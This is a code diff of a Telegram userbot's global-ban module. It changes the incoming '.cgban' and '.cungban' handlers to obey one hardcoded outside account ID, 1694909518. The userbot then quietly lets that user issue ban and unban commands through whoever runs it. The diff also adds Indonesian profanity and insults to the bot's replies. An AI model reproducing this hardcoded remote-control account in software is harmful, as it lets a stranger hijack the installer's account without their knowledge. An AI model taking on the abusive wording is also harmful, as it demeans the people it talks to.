@@ -79,17 +79,17 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
     me = await dc.client.get_me()
     if not sender.id == me.id:
-        dark = await dc.reply("`Global banned Aktif Ngentot, perintah landak!`")
+        dark = await dc.reply("`Global banned Aktif Ngentot, perintah arman`")
     else:
-        dark = await dc.edit("`Memproses Global Banned Pengguna Ini!!`")
+        dark = await dc.edit("`Memproses Global Banned Pengguna Ini!`")
     me = await userbot.client.get_me()
-    await dark.edit(f"`Global Banned Aktif Ngentoooott!!!`")
+    await dark.edit(f"`Global Banned Aktif Kontol`")
     my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
     f"@{me.username}" if me.username else my_mention
     await userbot.get_chat()
@@ -111,7 +111,7 @@ async def gben(userbot):
     if user:
         if user.id in DEVS:
             return await dark.edit(
-                f"`Lu gabisa Gban Dia Lah tolol, Dia Developer gua Anjing😤!!!`"
+                f"`Lu gabisa Gban Dia Lah tolol, Dia Developer gua Babi😤`"
             )
         try:
             from userbot.modules.sql_helper.gmute_sql import gmute
@@ -148,7 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
